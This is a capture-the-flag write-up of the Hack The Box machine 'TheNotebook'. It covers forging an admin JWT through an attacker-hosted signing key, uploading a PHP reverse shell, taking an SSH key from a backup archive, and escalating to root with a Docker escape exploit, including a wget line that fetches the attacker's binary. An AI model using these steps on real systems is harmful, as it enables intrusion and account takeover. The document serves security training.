---
layout: post
title: TheNotebook
published: true
---

**TheNotebook is a medium box from Hack The Box.**

### Enumeration

The first step is always a full port scan.

`nmap -sC -sV -v -p- -oA enum/nmap 10.10.10.230`

```
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http       nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: B2F904D3046B07D05F90FB6131602ED2
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
8000/tcp  open     tcpwrapped
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH and HTTP open, plus a couple high ports that don't look very interesting. I'll check out the web server first.

![Pasted image 20210722125627](https://user-images.githubusercontent.com/60187707/127748133-8af42713-4ba7-4e3d-bb27-04f2eb05e8c0.png)

It's a simple HTML site, not much functionality to speak of. I can create a new user and publish simple notes.

![Pasted image 20210722125902](https://user-images.githubusercontent.com/60187707/127748173-26b986aa-35c5-442d-b9ec-c80de4116e63.png)

The URL(`http://10.10.10.230/f402dba3-2e5f-4cf3-80ef-2cacc5d30990/notes/6`) appears to be constructed of a unique user string representing the user's directory, and the notes are stored within a subdirectory. My test note is file number 6. Maybe there are other notes in that folder already?

![Pasted image 20210722125913](https://user-images.githubusercontent.com/60187707/127748219-68722166-33a0-4664-b7c2-3791009a306c.png)

Even if there were, I can't access them. Taking a look at my cookies reveals a bit more.

![Pasted image 20210722130257](https://user-images.githubusercontent.com/60187707/127748252-c8ac0a80-7d62-4c3f-b66d-0d738b0c34da.png)

Looks like my user's home directory is also the UUID cookie. The auth cookie is a bit more interesting, however.

![Pasted image 20210722175120](https://user-images.githubusercontent.com/60187707/127748457-511465b5-c0da-43e6-a2b4-f53b9aae43fd.png)

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRyb24iLCJlbWFpbCI6InRyb25AdHJvbi5odGIiLCJhZG1pbl9jYXAiOmZhbHNlfQ.BgX_ieiO4bzI_jJE32EleGOqLUhnPYe-HB0kSzaB-VCl7QfHxWUX2fkw_lfL7F9a6bIhTibnCvPjzUVEx0CWD0ZK7iypcN3SH-F-nq2eqJKOQ3cHLqv9Hm5y1kcUe9EcGxFevWsqQkSeeiL51iyV-oTcoQnDuDWaeKs9EctjOSndUHi51ljkw9vpyh19dYwuxU_yTbvnpw7k7cCiBACVhCY-tzb45qjkreC4_eSp5iXcVAbAWORC2zSb44N9NMdQAYfRBQX2DqKGeMqSiuBXCxwD9kCJhQWU7hd1HrrLaK-0ZzFl58CY_-060GvUV7cNzjj0oKdY3KsJ-Njbr_xh9zHD7Fj5O4PiEQ3oSM2MQRou1elsmU29hOWZJh5QsWcdTQ3BSpHOxrZJtJGeoXy2jmupwwQmGqYSExmgKu8uxD3Tk87BVO3xFbRP8zqXOt5kprOTZM1IdIrlt7-PFaOUOAih4rsUnZQ6GQTOorN6FOFMCdZ03OnvNf31QsmmNeAVTBvwdxRa_DXU8QVzYUrRVQfVuunOca_6WojnVYOt_PxPSZAOSBPhcH_icMXHzytvEJVwt6E33TZH8H0GzFaMWJUcoRKFEig6Ix5bnIHYFEG_8y2ggA2xoJMFhYVTkLNR1HLiImspL-rloOj252zJmAyKKXT8x_CCLfWGILpAvgA
```

At first glance it just looks like a random string, but I base64 decoded it, just to see what would happen:

![Pasted image 20210722131547](https://user-images.githubusercontent.com/60187707/127748311-08f74bd6-a349-442d-925d-26a1e2934ecf.png)

There is some very promising information inside this cookie. I put it into the [JWT Debugger](https://jwt.io/) to make it a bit easier to parse.

![Pasted image 20210722134823](https://user-images.githubusercontent.com/60187707/127748433-f8ec3ffc-29a5-4c9e-8b34-7b6841d2b6b8.png)

### Exploitation
The auth cookie is a base64 encoded [JSON Web Token](https://jwt.io/introduction), that contains some user information, a permission boolean, as well as an encryption scheme. The key is signed by an RSA keypair, verified by the private key at http://localhost:7070/privKey.key.

In the course of enumeration web directories, I discovered an admin panel at thenotebook.htb/admin. I am unable to view it as my current user, but if I can generate a signed JWT assigning myself admin capablities, I may be able to. 

I generated myself a [JWK Key Pair](https://mkjwk.org/) according to the specified algorithm, created a token with `admin_cap = 1`, and signed that token with the keypair:

![Pasted image 20210722175003](https://user-images.githubusercontent.com/60187707/127748645-3c04ec14-b385-4365-850e-c99f24e600af.png)

The final step is to host the corresponding private key on my own web server.

`sudo python -m SimpleHTTPServer 80`

Paste the cookie into the cookie editor:

![Pasted image 20210722175120](https://user-images.githubusercontent.com/60187707/127748681-8b873962-e4ce-4793-b28d-cc823e73e09a.png)

Refresh the page and I can view the admin panel!

![Pasted image 20210722175155](https://user-images.githubusercontent.com/60187707/127748695-88e039e2-b8cd-4f46-8d5f-f360fc5bd797.png)

My user now has the ability to upload files. I uploaded a php reverse shell and clicked `View` to execute the payload:

![Pasted image 20210722175429](https://user-images.githubusercontent.com/60187707/127748735-1933d396-4005-43bd-b2b0-a9eed3f54d42.png)

I now have a shell on the box as `www-data`:

![Pasted image 20210722175351](https://user-images.githubusercontent.com/60187707/127748744-01d867f2-d368-4385-9339-c8cbc1d45f4b.png)

### Privilege Escalation

Upgrade my shell a bit with `python3 -c 'import pty; pty.spawn("/bin/bash")'`, and start poking around the filesystem.

In `/var/backups` there is an archive named `home.tar.gz` that I am able to read. I move it to `/tmp`, where I should have write access, and extract it.

![Pasted image 20210722180704](https://user-images.githubusercontent.com/60187707/127748854-fdb1a201-91f4-4881-8593-c296d2393b1d.png)

It appears to be backups of the entire `/home` directory. I can view `noah`'s files, specifically his private SSH key.

![Pasted image 20210722180729](https://user-images.githubusercontent.com/60187707/127748833-4b35bfc8-a3cc-4a58-b8e1-78b7e93ebe3c.png)

I can copy that over to my machine and use that to login as `noah`. Copy/paste into a file, change the permissions, and log in:

![Pasted image 20210722180818](https://user-images.githubusercontent.com/60187707/127748887-d31cd7f9-7987-4e66-a9f7-7e7e85d57590.png)

Now I'm on as `noah`. I don't have a password, but it doesn't hurt to check and see if I can run `sudo` with no password.

`sudo -l`
```
User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

I can run a particular Docker command, but I can control the end of the command. Googling around for an exploit eventually turns up a [docker escape](https://github.com/Frichetten/CVE-2019-5736-PoC) Go exploit.

Once I configure the Go script with my payload and run it on the target, I'll be able to trigger it by calling `/bin/sh` on the container with `sudo`.

![Pasted image 20210723105525](https://user-images.githubusercontent.com/60187707/127749061-5781a7eb-a337-4219-bf5b-e9339193f5b9.png)

Change the script to set the SUID on `/bin/bash` and build it with `go build main.go`.

Host that file on my Python server, pull it down to the target, set it to be executable, and run it.

`wget http://10.10.14.22/main`

![Pasted image 20210723105644](https://user-images.githubusercontent.com/60187707/127749085-586778b7-ff77-4e1a-a868-5e351c0c9e5b.png)

The script exited with no apparent errors, so now I need to trigger it.

`sudo /usr/bin/docker exec -it webapp-dev01 sh`

![Pasted image 20210723105714](https://user-images.githubusercontent.com/60187707/127749108-5bd28f2f-0b31-445a-8397-4dca3e68234b.png)

With that complete, I can drop into a root shell with `bash -p`.









